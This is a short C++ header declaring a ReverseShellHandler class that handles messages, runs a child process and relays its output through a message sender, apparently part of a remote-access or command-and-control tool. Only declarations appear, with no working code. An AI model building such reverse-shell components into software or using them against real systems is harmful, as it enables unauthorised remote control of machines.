#pragma once
#include <memory>

#include "IMessageHandler.h"
#include "IMessageSender.h"
#include "Process.h"
#include "ThreadGuard.h"

class ReverseShellHandler : public IMessageHandler
{
public:
	ReverseShellHandler(
		IMessageSender* sender);

	void Handle(MessageType type, std::span<char> content) override;

	void ReadOutput() const;
private:
	IMessageSender* _sender;
	std::unique_ptr<Process> _process;
	std::unique_ptr<ThreadGuard> _thread;
};

